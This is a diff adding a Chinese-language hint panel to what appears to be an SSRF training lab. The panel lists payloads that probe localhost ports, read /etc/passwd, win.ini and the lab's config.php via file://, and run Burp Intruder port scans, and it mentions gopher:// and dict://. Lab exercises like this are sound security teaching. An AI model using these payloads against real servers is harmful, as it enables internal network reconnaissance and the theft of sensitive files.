@@ -1,0 +1,20 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>SSRF 的核心是<b>服务器帮你去请求一个 URL</b>，你可以让它访问内网、读本地文件。思路分三层：① 让服务器访问 <code>http://127.0.0.1:端口</code> 探测本机服务；② 用 <code>file://</code> 协议读服务器本地文件；③ 用 <code>http://127.0.0.1:§端口§</code> 配合 Burp Intruder 做内网端口扫描，对比响应差异判断端口是否开放。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>目标1 - 探测本机服务：</b><br>
+<code>?url=http://127.0.0.1:3306</code>（MySQL，观察返回内容/耗时差异）<br>
+<code>?url=http://127.0.0.1:80</code>（本机 Apache）<br>
+<b>目标2 - file:// 读文件：</b><br>
+Windows：<code>?url=file:///C:/Windows/win.ini</code><br>
+Linux：<code>?url=file:///etc/passwd</code><br>
+读靶场配置：<code>?url=file:///<?php echo str_replace('\\', '/', BASE_DIR); ?>/config.php</code><br>
+<b>目标3 - 端口扫描思路：</b><br>
+Burp Intruder 爆破 <code>?url=http://127.0.0.1:§80§</code>，payload 用数字 1-10000，<br>
+开放端口 vs 关闭端口：响应内容/状态码/耗时明显不同。<br>
+<b>扩展：</b>还试试 dict:// gopher://（需 curl 支持）、http://localhost/。
+</div>
+</details>
